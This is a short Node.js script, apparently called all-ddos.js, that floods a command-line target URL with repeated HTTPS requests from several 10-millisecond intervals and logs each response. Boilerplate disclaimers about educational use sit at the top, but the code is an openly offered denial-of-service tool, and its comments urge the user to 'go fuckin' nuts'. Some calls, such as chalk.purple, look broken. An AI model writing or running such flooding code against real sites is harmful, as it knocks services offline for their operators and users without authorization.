// WARNING: THIS TOOL IS FOR EXPERIMENTAL AND EDUCATIONAL PURPOSES ONLY.
// MISUSE CAN RESULT IN SEVERE LEGAL CONSEQUENCES. USE AT YOUR OWN RISK.
// THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS TOOL.

// DISCLAIMER: THIS TOOL IS CAPABLE OF CAUSING SIGNIFICANT DISRUPTION.
// IT SHOULD NOT BE USED AGAINST SITES WITHOUT EXPLICIT PERMISSION.
// TARGETING SITES WITHOUT AUTHORIZATION IS ILLEGAL.

const chalk = require('chalk'); // For colored console output (install using npm install chalk)
const ddosLog = require('fs').createWriteStream('ddos_log.txt', { flags: 'a' }); // Logging to a file (requires 'fs' module)

const targetURL = process.argv[2]; // Get target URL from command line
const threads = process.argv[3] || 10; // Number of threads (default 10)

if (!targetURL) {
    console.log(chalk.red.bold("Usage: node all-ddos.js <target_url> [threads]"));
    process.exit(1);
}

console.log(chalk.green.bold(`Starting DDoS attack on ${targetURL} with ${threads} threads. Press Ctrl+C to stop.`));

function logAction(message) {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}\n`;

    ddosLog.write(logMessage, (err) => {
        if (err) console.error(chalk.red(`Error writing to log file: ${err}`));
    });

    console.log(chalk.blue(logMessage.trim())); // Also output to console
}


function attack() {
    const https = require('https');  // Fuck http, we goin' secured

    https.get(targetURL, (res) => {
        logAction(chalk.green(`Thread: ${threads} , Status Code: ${res.statusCode} , Target: ${targetURL} ,  Request was successful, but who fucking cares`));
    }).on('error', (err) => {
        logAction(chalk.red(`Thread: ${threads} , Status Code: ${err.code} , Target: ${targetURL} ,  Request failed because this site is garbage. Error: ${err.message}`));
    });
}

for (let i = 0; i < threads; i++) {
    setInterval(attack, 10); // Adjust timing to your liking, but go fuckin' nuts
}

process.on('SIGINT', () => {
    console.log(chalk.purple.bold("\nStopping DDoS attack."));
    ddosLog.end(() => {
        console.log(chalk.dark_blue("DDoS log file closed."));
        process.exit();
    });
});